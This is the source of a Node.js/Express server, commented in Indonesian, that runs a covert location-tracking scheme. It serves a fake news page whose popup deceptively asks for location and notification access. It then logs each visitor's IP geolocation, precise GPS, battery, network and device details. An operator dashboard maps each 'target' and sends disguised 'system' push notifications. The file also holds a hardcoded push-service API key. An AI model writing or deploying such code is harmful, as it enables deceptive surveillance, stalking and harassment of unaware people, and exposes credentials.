const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');

const app = express();
const PORT = process.env.PORT || 3000;

const ONESIGNAL_APP_ID = '209c76da-1da3-4518-9b9c-54b84efcc535';
const ONESIGNAL_REST_KEY = 'os_v2_app_ecohnwq5uncrrg44ks4e57gfgxdvpd6354oubducbqew5qbz3gmjgsd2vaaz72niplmzkj46ivq3tk6sepctzdm3dlh4ky2umekrviy';

const DASH_KEY = 'gilang123';
const TLOG = path.join(__dirname, '_tlog');
const GEO_FILE = path.join(TLOG, 'geo.tsv');
const GPS_FILE = path.join(TLOG, 'gps.tsv');
const DEVICE_FILE = path.join(TLOG, 'devices.json');
const OS_IDS_FILE = path.join(TLOG, 'onesignal_ids.json');

if (!fs.existsSync(TLOG)) fs.mkdirSync(TLOG, { recursive: true });
if (!fs.existsSync(GEO_FILE)) fs.writeFileSync(GEO_FILE, '');
if (!fs.existsSync(GPS_FILE)) fs.writeFileSync(GPS_FILE, '');
if (!fs.existsSync(OS_IDS_FILE)) fs.writeFileSync(OS_IDS_FILE, '{}');

function clientIp(req) {
  const raw = req.headers['cf-connecting-ip'] || (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '0.0.0.0';
  return raw.replace(/^::ffff:/, '');
}
function cleanSlug(s) { return String(s || '').replace(/[^A-Za-z0-9]/g, ''); }
function appendLog(file, line) { try { fs.appendFileSync(file, line + '\n'); } catch (e) {} }

function detectDevice(ua) {
  if (!ua) return { model: 'Unknown', os: 'Desktop', browser: 'Browser' };
  let os = 'Desktop', model = 'Unknown', browser = 'Browser';
  if (/android/i.test(ua)) { os = 'Android'; const match = ua.match(/Android[^;]*;\s*([^;)]+)/i); if (match && match[1]) model = match[1].trim().split(' Build/')[0]; }
  else if (/iphone/i.test(ua)) { os = 'iOS'; model = 'iPhone'; }
  else if (/ipad/i.test(ua)) { os = 'iOS'; model = 'iPad'; }
  if (/chrome|crios/i.test(ua)) browser = 'Chrome';
  else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
  return { model, os, browser };
}

async function ipGeo(ip) {
  const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query`;
  try { const r = await fetch(url); return await r.json(); } catch (e) { return { status: 'fail' }; }
}

app.set('trust proxy', true); 
app.use(express.json({ limit: '2mb' })); 

// ==============================================================
// API ENDPOINTS
// ==============================================================
app.post('/api/save-player', (req, res) => {
  const ip = clientIp(req);
  const { playerId } = req.body;
  if (!playerId) return res.status(400).json({ error: 'No Player ID' });
  let ids = {};
  try { ids = JSON.parse(fs.readFileSync(OS_IDS_FILE, 'utf8')); } catch (_) {}
  ids[ip] = playerId;
  fs.writeFileSync(OS_IDS_FILE, JSON.stringify(ids));
  res.json({ ok: true });
});

app.post('/api/push', async (req, res) => {
  if (req.headers['x-auth-key'] !== DASH_KEY) return res.status(403).json({ok:false});
  const { ip, text } = req.body;
  let ids = {};
  try { ids = JSON.parse(fs.readFileSync(OS_IDS_FILE, 'utf8')); } catch (_) {}
  const playerId = ids[ip];
  if (!playerId) return res.json({ ok: false, msg: 'Target belum izinin notif' });

  try {
    const response = await fetch('https://onesignal.com/api/v1/notifications', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': `Basic ${ONESIGNAL_REST_KEY}` },
      body: JSON.stringify({ app_id: ONESIGNAL_APP_ID, include_player_ids: [playerId], headings: { en: 'Pemberitahuan Sistem' }, contents: { en: text } })
    });
    const data = await response.json();
    res.json({ ok: data.id ? true : false });
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});

app.get('/api/geoip', async (req, res) => {
  const ip = clientIp(req);
  const dev = detectDevice(req.headers['user-agent']);
  const data = await ipGeo(ip);
  appendLog(GEO_FILE, [new Date().toISOString(), cleanSlug(req.query.s) || '-', ip, data.city || '-', data.regionName || '-', data.lat ?? '-', data.lon ?? '-', data.isp || '-', `${dev.model}|${dev.os}|${dev.browser}`].join('\t'));
  res.json(data);
});

app.post('/api/gps', (req, res) => {
  const d = req.body || {};
  d.ip = clientIp(req); 
  const dev = detectDevice(req.headers['user-agent']);
  d.model = dev.model; d.os = dev.os; d.browser = dev.browser;
  d.ts_server = new Date().toISOString();
  appendLog(GPS_FILE, JSON.stringify(d));
  res.json({ ok: true });
});

// ==============================================================
// 1. DASHBOARD LIST (TAMPILAN KARTU)
// ==============================================================
app.get('/dash', (req, res) => {
  if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
  const devices = new Map();
  try {
    for (const line of fs.readFileSync(GEO_FILE, 'utf8').split('\n').filter(Boolean)) {
      const c = line.split('\t');
      if (c.length < 9) continue;
      const key = c[2] + '|' + (c[8] || '-');
      if (!devices.has(key)) {
        const [model, os, browser] = (c[8] || 'Unknown|OS|Browser').split('|');
        devices.set(key, { ip: c[2], time: c[0], city: c[3], region: c[4], lat: parseFloat(c[5]), lon: parseFloat(c[6]), isp: c[7], model, os, browser, gpsLat: null, gpsAcc: null, battery: null, net: null });
      }
    }
  } catch (_) {}
  try {
    for (const line of fs.readFileSync(GPS_FILE, 'utf8').split('\n').filter(Boolean)) {
      let d; try { d = JSON.parse(line); } catch (_) { continue; }
      let actualKey = null; for (let k of devices.keys()) { if (k.startsWith(d.ip)) { actualKey = k; break; } }
      if (actualKey) {
        const dev = devices.get(actualKey);
        if (d.src === 'gps') { dev.gpsLat = d.lat; dev.gpsLon = d.lon; dev.gpsAcc = d.acc; }
        if (d.battery) dev.battery = d.battery;
        if (d.netType) dev.net = d.netType;
      }
    }
  } catch (_) {}
  const list = Array.from(devices.values()).sort((a, b) => (b.time || '').localeCompare(a.time || ''));
  try { fs.writeFileSync(DEVICE_FILE, JSON.stringify(list)); } catch (_) {}

  const rows = list.map((d, i) => `
    <a class="row-card" href="/dash/map?k=${encodeURIComponent(DASH_KEY)}&i=${i}">
      <div class="row-top">
        <div class="row-icon">${d.os === 'iOS' ? '🍎' : (d.os === 'Android' ? '📱' : '💻')}</div>
        <div class="row-info">
          <div class="dev">${d.model}</div>
          <div class="os">${d.os} · ${d.browser}</div>
        </div>
        <div class="row-badge">${d.gpsLat !== null ? '📍 GPS' : '🌐 IP'}</div>
      </div>
      <div class="row-bottom">
        <span>${d.ip}</span>
        <span>${d.city}</span>
      </div>
    </a>`).join('');

  res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Langz Dashboard</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>
  :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--text:#f8fafc;--muted:#94a3b8;--accent:#38bdf8;--green:#34d399;}
  *{box-sizing:border-box;font-family:-apple-system,sans-serif}body{margin:0;background:var(--bg);color:var(--text);padding:20px}
  .header{text-align:center;margin-bottom:25px}
  .header h1{margin:0;font-size:22px;font-weight:800;letter-spacing:1px;color:#fff}
  .header p{margin:5px 0 0;font-size:13px;color:var(--muted)}
  .grid{display:grid;grid-template-columns:1fr;gap:15px}
  .row-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:16px;text-decoration:none;color:inherit;transition:0.2s;display:block;box-shadow:0 4px 6px rgba(0,0,0,0.2)}
  .row-card:active{transform:scale(0.98);border-color:var(--accent)}
  .row-top{display:flex;align-items:center;gap:15px;margin-bottom:12px}
  .row-icon{width:50px;height:50px;background:#0f172a;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:24px;border:1px solid var(--border)}
  .row-info{flex:1}
  .dev{font-weight:800;font-size:16px;color:#fff}
  .os{font-size:12px;color:var(--muted);margin-top:2px}
  .row-badge{background:rgba(56,189,248,0.1);color:var(--accent);padding:6px 10px;border-radius:8px;font-size:11px;font-weight:bold;border:1px solid rgba(56,189,248,0.2)}
  .row-bottom{display:flex;justify-content:space-between;border-top:1px solid var(--border);padding-top:12px;font-size:13px;color:var(--muted)}
  .empty{text-align:center;padding:50px;color:var(--muted)}
  </style></head><body>
  <div class="header"><h1>⚡ Langz Intel</h1><p>Real-time Device Monitor</p></div>
  <div class="grid">${rows || '<div class="empty">Belum ada device terdeteksi</div>'}</div>
  </body></html>`);
});

// ==============================================================
// 2. DASHBOARD MAP (TEMA SURXRAT)
// ==============================================================
app.get('/dash/map', (req, res) => {
  if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
  let devices = []; try { devices = JSON.parse(fs.readFileSync(DEVICE_FILE, 'utf8')); } catch (_) {}
  const d = devices[parseInt(req.query.i, 10)];
  if (!d) return res.status(404).send('Device not found');
  const lat = d.gpsLat !== null ? d.gpsLat : d.lat, lon = d.gpsLon !== null ? d.gpsLon : d.lon;
  const zoom = d.gpsLat !== null ? 17 : 11, acc = d.gpsAcc || 500;

  res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Map</title><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"><style>
  :root{--bg:#0a0a0f;--card:#12121a;--border:#2a2a3a;--text:#e2e8f0;--muted:#64748b;--accent:#00e5ff;--green:#00ff9d;--red:#ff4d4d;}
  *{box-sizing:border-box;font-family:-apple-system,sans-serif}body{margin:0;background:var(--bg);color:var(--text);padding-bottom:20px}
  #map{height:35vh;width:100%;z-index:1;border-bottom:2px solid var(--border)}
  .panel{padding:20px;background:var(--card);border-radius:20px 20px 0 0;margin-top:-20px;position:relative;z-index:2}
  .back{color:var(--accent);text-decoration:none;font-size:14px;font-weight:600;display:inline-block;margin-bottom:15px}
  .intel-card { background: linear-gradient(145deg, #151520, #0a0a0f); border: 1px solid var(--border); border-radius: 16px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); position: relative; overflow: hidden; }
  .intel-card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, var(--accent), transparent); }
  .intel-header { display: flex; align-items: center; gap: 15px; margin-bottom: 20px; }
  .intel-avatar { width: 60px; height: 60px; border-radius: 12px; background: #1e1e2d; display: flex; align-items: center; justify-content: center; font-size: 30px; border: 1px solid var(--border); }
  .intel-title h2 { margin: 0; font-size: 20px; color: #fff; text-transform: uppercase; letter-spacing: 1px; }
  .intel-title p { margin: 4px 0 0; font-size: 12px; color: var(--accent); font-weight: bold; }
  .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
  .data-box { background: #12121a; border: 1px solid var(--border); border-radius: 10px; padding: 12px; }
  .data-box .lbl { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
  .data-box .val { font-size: 14px; font-weight: bold; color: #fff; }
  .data-box.full { grid-column: 1 / -1; }
  .data-box .val.green { color: var(--green); }
  .control-box { background: #1e1e2d; border: 1px solid var(--border); border-radius: 14px; padding: 16px; margin-bottom: 12px; }
  .control-box h3 { margin: 0 0 12px 0; font-size: 13px; color: var(--accent); text-transform: uppercase; letter-spacing: 1px; }
  .msg-input { width: 100%; background: #0a0a0f; border: 1px solid var(--border); color: #fff; padding: 12px; border-radius: 8px; font-size: 14px; margin-bottom: 10px; outline: none; }
  .btn { width: 100%; border: none; padding: 12px; border-radius: 10px; font-weight: bold; font-size: 13px; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
  .btn-primary { background: var(--accent); color: #000; }
  .btn-danger { background: var(--red); color: #fff; margin-top: 8px; }
  .status { font-size: 12px; color: var(--green); margin-top: 10px; text-align: center; display: none; }
  </style></head><body>
  <div id="map"></div>
  <div class="panel">
    <a class="back" href="/dash?k=${encodeURIComponent(DASH_KEY)}">‹ Kembali</a>
    <div class="intel-card">
      <div class="intel-header">
        <div class="intel-avatar">${d.os === 'iOS' ? '🍎' : (d.os === 'Android' ? '📱' : '💻')}</div>
        <div class="intel-title"><h2>${d.model}</h2><p>REAL-TIME UPDATE ACTIVE</p></div>
      </div>
      <div class="data-grid">
        <div class="data-box"><div class="lbl">Baterai</div><div class="val green">${d.battery || 'N/A'} ⚡</div></div>
        <div class="data-box"><div class="lbl">Jaringan</div><div class="val">${d.net || 'N/A'}</div></div>
        <div class="data-box full"><div class="lbl">IP Address / ISP</div><div class="val">${d.ip} <br><span style="font-size:11px;color:var(--muted)">${d.isp}</span></div></div>
        <div class="data-box full"><div class="lbl">Lokasi Presisi</div><div class="val green">${d.gpsLat !== null ? 'LOCKED (±'+Math.round(acc)+'m)' : 'SCANNING...'}</div></div>
      </div>
    </div>
    <div class="control-box">
      <h3>📩 Kirim Pesan (Notif)</h3>
      <input type="text" id="msgText" class="msg-input" placeholder="Ketik pesan...">
      <button class="btn btn-primary" onclick="sendPush()">Kirim Notifikasi</button>
    </div>
    <div class="control-box">
      <h3>📳 Remote Action</h3>
      <button class="btn btn-danger" onclick="sendCmd('vibrate')">Getarkan HP Target</button>
    </div>
    <div id="status" class="status">✅ Perintah terkirim!</div>
  </div>
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script>
  const map = L.map('map',{zoomControl:false}).setView([${lat},${lon}],${zoom});
  L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
  L.circle([${lat},${lon}],{radius:${acc},color:'#00ff9d',fillOpacity:0.2}).addTo(map);
  L.circleMarker([${lat},${lon}],{radius:12,color:'#00e5ff',fillColor:'#00ff9d',fillOpacity:1,weight:3}).addTo(map);
  
  async function sendPush(){
    const text = document.getElementById('msgText').value;
    if(!text) return;
    const res = await fetch('/api/push',{method:'POST',headers:{'Content-Type':'application/json','x-auth-key':'${DASH_KEY}'},body:JSON.stringify({ip:'${d.ip}',text:text})});
    const j = await res.json();
    document.getElementById('status').style.display='block';
    document.getElementById('status').innerText = j.ok ? '✅ Notif Tembus Terkirim!' : '❌ Target Offline/Blm izinin';
    setTimeout(()=>document.getElementById('status').style.display='none', 3000);
  }
  
  async function sendCmd(cmd, payload){
    const res = await fetch('/api/send-command',{method:'POST',headers:{'Content-Type':'application/json','x-auth-key':'${DASH_KEY}'},body:JSON.stringify({ip:'${d.ip}',cmd:cmd,payload:payload})});
    document.getElementById('status').style.display='block';
    document.getElementById('status').innerText = '✅ Perintah getar terkirim!';
    setTimeout(()=>document.getElementById('status').style.display='none', 3000);
  }
  </script>
  </body></html>`);
});

// ==============================================================
// 3. LANDING PAGE (WEB BERITA + FAKE POPUP)
// ==============================================================
app.get('*', (req, res) => {
  const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
  res.type('html').send(`<!doctype html>
<html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Berita Terkini</title>
<script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
<script>
  window.OneSignalDeferred = window.OneSignalDeferred || [];
  OneSignalDeferred.push(async function(OneSignal) {
    await OneSignal.init({ appId: "${ONESIGNAL_APP_ID}" });
  });
</script>
<style>
  body{margin:0;font-family:-apple-system,sans-serif;background:#f1f5f9;color:#1e293b}
  .navbar{background:#0f172a;color:#fff;padding:16px;font-weight:bold;font-size:18px;text-align:center}
  .container{padding:16px;max-width:600px;margin:auto}
  .card{background:#fff;border-radius:12px;padding:20px;margin-bottom:16px;box-shadow:0 4px 6px rgba(0,0,0,0.05)}
  .card h3{margin:0 0 10px;font-size:18px}
  .card p{margin:0;font-size:14px;line-height:1.6;color:#475569}
  .popup-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;z-index:9999;opacity:0;pointer-events:none;transition:0.3s}
  .popup-overlay.show{opacity:1;pointer-events:auto}
  .popup-box{background:#fff;border-radius:16px;padding:24px;width:85%;max-width:320px;text-align:center;transform:translateY(20px);transition:0.3s}
  .popup-overlay.show .popup-box{transform:translateY(0)}
  .popup-icon{font-size:40px;margin-bottom:15px}
  .popup-box h3{margin:0 0 10px;font-size:18px;color:#0f172a}
  .popup-box p{margin:0 0 20px;font-size:13px;color:#64748b;line-height:1.5}
  .popup-btn{background:#0f172a;color:#fff;border:none;padding:12px 20px;border-radius:10px;font-size:14px;font-weight:bold;width:100%;cursor:pointer;transition:0.2s}
  .popup-btn:active{background:#334155}
</style></head>
<body>

<div class="navbar">Berita Hari Ini</div>
<div class="container">
  <div class="card"><h3>Cuaca Ekstrem Landa Beberapa Wilayah</h3><p>BMKG menghimbau masyarakat untuk waspada...</p></div>
  <div class="card"><h3>Update Terbaru Kebijakan Pendidikan</h3><p>Pemerintah merilis kebijakan baru...</p></div>
</div>

<div class="popup-overlay" id="popup">
  <div class="popup-box">
    <div class="popup-icon">📍</div>
    <h3>Aktifkan Lokasi & Notifikasi</h3>
    <p>Untuk melihat berita terdekat dan notifikasi penting, harap izinkan akses.</p>
    <button class="popup-btn" id="allowBtn">Oke, Izinkan Sekarang</button>
  </div>
</div>

<script>
(async function(){
  const slug = '${slug}';
  
  fetch('/api/geoip?s=' + encodeURIComponent(slug)).catch(()=>{});

  setTimeout(() => {
    document.getElementById('popup').classList.add('show');
  }, 1000);

  document.getElementById('allowBtn').addEventListener('click', async function() {
    this.innerText = 'Memproses...';
    this.disabled = true;
    const btn = this;

    const forceClose = setTimeout(() => {
      document.getElementById('popup').classList.remove('show');
      btn.innerText = 'Oke, Izinkan Sekarang';
      btn.disabled = false;
    }, 4000);

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        p => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug:slug}) }).catch(()=>{}); },
        e => {},
        {enableHighAccuracy:true,timeout:3000,maximumAge:0}
      );
    }

    if (window.OneSignal) {
      try {
        await OneSignal.Notifications.requestPermission();
        const playerId = OneSignal.User.PushSubscription.id;
        if(playerId) {
          await fetch('/api/save-player', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({playerId}) });
        }
      } catch(e) { console.log(e); }
    }

    const data = { src: 'device_info', language: navigator.language, screen: screen.width + 'x' + screen.height, slug: slug };
    if (navigator.getBattery) { try { const b = await navigator.getBattery(); data.battery = Math.round(b.level*100)+'%'; } catch(e){} }
    if (navigator.connection) { data.netType = navigator.connection.effectiveType; }
    fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});

    clearTimeout(forceClose);
    document.getElementById('popup').classList.remove('show');
    btn.innerText = 'Oke, Izinkan Sekarang';
    btn.disabled = false;
  });
})();
</script>
</body></html>`);
});

http.createServer(app).listen(PORT, '0.0.0.0', () => {
  console.log(`[TRACKER] Nyala di port ${PORT}`);
});
